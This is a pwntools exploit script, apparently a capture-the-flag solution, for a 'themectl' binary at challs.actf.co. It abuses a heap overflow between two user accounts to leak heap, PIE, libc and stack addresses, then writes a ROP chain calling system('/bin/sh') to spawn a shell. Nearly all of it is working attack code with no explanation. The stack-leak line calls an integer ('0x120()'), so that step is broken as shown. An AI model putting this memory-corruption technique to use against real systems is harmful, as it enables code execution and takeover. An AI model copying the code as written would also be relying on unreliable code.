from pwn import *

exe = './themectl_patched'

(host,port_num) = ("challs.actf.co",31325)

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug(
            [exe] + argv, gdbscript=gscpt, *a, **kw)
    elif args.RE:
        return remote(host,port_num)
    else:
        return process( 
            [exe] + argv, *a, **kw)
    
gscpt = (
    '''
b * main
'''
).format(**locals())

context.update(arch='amd64')

# SHORTHANDS FOR FNCS
se  = lambda nbytes     : p.send(nbytes)
sl  = lambda nbytes     : p.sendline(nbytes,timeout=10)
sa  = lambda msg,nbytes : p.sendafter(msg,nbytes,timeout=10)
sla = lambda msg,nbytes : p.sendlineafter(msg,nbytes,timeout=10)
rv  = lambda nbytes     : p.recv(nbytes,timeout=10)
rvu = lambda msg        : p.recvuntil(msg,timeout=10)
rvl = lambda            : p.recvline()

# SIMPLE PRETTY PRINTER
def w(*args):
    print(f"〔\033[1;32m>\033[0m〕",end="")
    for i in args:
        print(hex(i)) if(type(i) == int) else print(i,end=" ")
    print("")

# PWNTOOLS CONTEXT
context.log_level = \
    'DEBUG'

# _____________________________________________________ #
# <<<<<<<<<<<<<<< EXPLOIT STARTS HERE >>>>>>>>>>>>>>>>> #

def login(username,password):
    sla(b"> ",b"2")
    sla(b"Username: ",username)
    sla(b"password: ",password)


def register(username,password,nthemes):
    sla(b"> ",b"1")
    sla(b"Username: ",username)
    sla(b"password: ",password)
    sla(b"like?",str(nthemes).encode())

def edit(idx, data):
    sla(b"> ", b'1')
    sla(b"edit? ", str(idx).encode())
    sla(b"idea: ", data)

def view(idx):
    sla(b"> ", b'2')
    sla(b"view? ", str(idx).encode())

def logout():
    sla(b"> ",b"4")

def exit():
    sla(b"> ",b"3")

p = start()

register(b"sasi",b"soman",0x10 - 0x4)
edit(0,b"hello there my name is markiplier")
logout()

register(b"sugunan",b"sugunot",0x10)
edit(0,b"/bin/sh")
logout()

# GETTING LEAKS

# HEAP LEAKS ===========================================
login(b"sasi",b"soman")
edit(0,0x28*b"a" + p64(0x91) + p64(0x10))
logout()

login(b"sugunan",b"sugunot")
view(0)

heap = u64(rv(6).ljust(8, b'\x00')) - 0x520
w(heap)
logout()

# PIE LEAKS ============================================
login(b"sasi",b"soman")
edit(0,0x28*b"a" + p64(0x91) + p64(0x10) + p64(heap + 0x2a0))
logout()

login(b"sugunan",b"sugunot")
view(0)
pie = u64(rv(6).ljust(8, b'\x00')) - 0x2008
w(pie)
logout()


# LIBC LEAKS ============================================
login(b"sasi",b"soman")
edit(0,0x28*b"a" + p64(0x91) + p64(0x10) + p64(pie + 0x3f68))
logout()

login(b"sugunan",b"sugunot")
view(0)
libc = u64(rv(6).ljust(8, b'\x00')) - 0x80e50
w(libc)
logout()

# STACK LEAKS =========================================
login(b"sasi",b"soman")
edit(0,0x28*b"a" + p64(0x91) + p64(0x10) + p64(libc + 0x222200))
logout()

login(b"sugunan",b"sugunot")
view(0)
stack = u64(rv(6).ljust(8, b'\x00')) - 0x120()
w(stack)
logout()

w("LEAKS ARE THE FOLLOWING >> ")
w("PIE  - ",pie)
w("HEAP - ",heap)
w("LIBC - ",libc)

# ARBITRARY WRITE =========================================
login(b"sasi",b"soman")
edit(0,0x28*b"a" + p64(0x91) + p64(0x10) + p64(stack))
logout()

poprdi = libc + 0x2a3e5
binsh  = libc + 0x1d8678
system = libc + 0x50d70

chain = p64(poprdi) + p64(heap + 0x560) + p64(poprdi + 1) + p64(system)
login(b"sugunan",b"sugunot")
edit(0,chain)
logout()
exit()

p.interactive()